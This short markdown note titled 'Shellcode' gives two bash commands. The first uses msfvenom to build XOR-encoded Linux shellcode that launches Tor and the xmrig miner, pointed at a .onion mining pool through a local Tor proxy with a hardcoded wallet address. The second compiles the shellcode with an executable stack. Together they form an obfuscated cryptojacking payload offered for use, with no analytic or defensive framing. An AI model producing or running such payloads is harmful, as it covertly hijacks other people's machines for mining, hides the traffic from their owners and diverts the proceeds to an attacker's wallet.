# Shellcode

## Generate shellcode
```bash
$ msfvenom -p linux/x86/exec CMD="tor -DataDirectory /root & xmrig --url hashvaultsvg2rinvxz7kos77hdfm6zrd5yco3tx2yh2linsmusfwyad.onion --proxy=localhost:9050 --user 41yjBrEhDeThnyvxhbiC3rQwcJtV3X1Zy8s9uW4NKUxVKaH59C4XyuW72D1DeLqm7oSGunxpu4WgNawx1FqWc1deCAZTauo --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14" -f c -e x86/xor_dynamic
```

## Compile shellcode
```bash
gcc -z execstack -m32 -o shellcode shell.c
```